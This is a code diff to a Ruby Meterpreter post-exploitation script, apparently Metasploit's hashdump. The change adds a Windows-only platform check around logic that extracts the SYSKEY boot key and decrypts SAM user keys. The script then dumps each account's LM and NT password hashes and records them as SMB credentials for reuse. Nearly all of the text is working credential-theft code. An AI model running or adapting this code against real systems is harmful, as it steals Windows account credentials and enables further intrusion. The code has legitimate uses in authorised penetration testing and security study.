@@ -219,45 +219,48 @@ def decrypt_user_hash(rid, hbootkey, enchash, pass)
 	d1o << d2.final
 	d1o + d2o
 end
+if client.platform =~ /win32|win64/
+	begin
 
-begin
+		print_status("Obtaining the boot key...")
+		bootkey  = capture_boot_key
 
-print_status("Obtaining the boot key...")
-bootkey  = capture_boot_key
+		print_status("Calculating the hboot key using SYSKEY #{bootkey.unpack("H*")[0]}...")
+		hbootkey = capture_hboot_key(bootkey)
 
-print_status("Calculating the hboot key using SYSKEY #{bootkey.unpack("H*")[0]}...")
-hbootkey = capture_hboot_key(bootkey)
+		print_status("Obtaining the user list and keys...")
+		users    = capture_user_keys
 
-print_status("Obtaining the user list and keys...")
-users    = capture_user_keys
+		print_status("Decrypting user keys...")
+		users    = decrypt_user_keys(hbootkey, users)
 
-print_status("Decrypting user keys...")
-users    = decrypt_user_keys(hbootkey, users)
+		print_status("Dumping password hashes...")
+		print_line()
+		print_line()
+		users.keys.sort{|a,b| a<=>b}.each do |rid|
+			hashstring = "#{users[rid][:Name]}:#{rid}:#{users[rid][:hashlm].unpack("H*")[0]}:#{users[rid][:hashnt].unpack("H*")[0]}:::"
+			@client.framework.db.report_auth_info(
+				:host  => client.sock.peerhost,
+				:port  => smb_port,
+				:sname => 'smb',
+				:user  => users[rid][:Name],
+				:pass  => users[rid][:hashlm].unpack("H*")[0] +":"+ users[rid][:hashnt].unpack("H*")[0],
+				:type  => "smb_hash"
+			)
+			print_line hashstring
+		end
+		print_line()
+		print_line()
 
-print_status("Dumping password hashes...")
-print_line()
-print_line()
-users.keys.sort{|a,b| a<=>b}.each do |rid|
-	hashstring = "#{users[rid][:Name]}:#{rid}:#{users[rid][:hashlm].unpack("H*")[0]}:#{users[rid][:hashnt].unpack("H*")[0]}:::"
-	@client.framework.db.report_auth_info(
-		:host  => client.sock.peerhost,
-		:port  => smb_port,
-		:sname => 'smb',
-		:user  => users[rid][:Name],
-		:pass  => users[rid][:hashlm].unpack("H*")[0] +":"+ users[rid][:hashnt].unpack("H*")[0],
-		:type  => "smb_hash"
-	)
-	print_line hashstring
+	rescue ::Interrupt
+		raise $!
+	rescue ::Rex::Post::Meterpreter::RequestError => e
+		print_error("Meterpreter Exception: #{e.class} #{e}")
+		print_error("This script requires the use of a SYSTEM user context (hint: migrate into service process)")
+	rescue ::Exception => e
+		print_error("Error: #{e.class} #{e} #{e.backtrace}")
+	end
+else
+	print_error("This version of Meterpreter is not supported with this Script!")
+	raise Rex::Script::Completed
 end
-print_line()
-print_line()
-
-rescue ::Interrupt
-	raise $!
-rescue ::Rex::Post::Meterpreter::RequestError => e
-	print_error("Meterpreter Exception: #{e.class} #{e}")
-	print_error("This script requires the use of a SYSTEM user context (hint: migrate into service process)")
-rescue ::Exception => e
-	print_error("Error: #{e.class} #{e} #{e.backtrace}")
-end
-
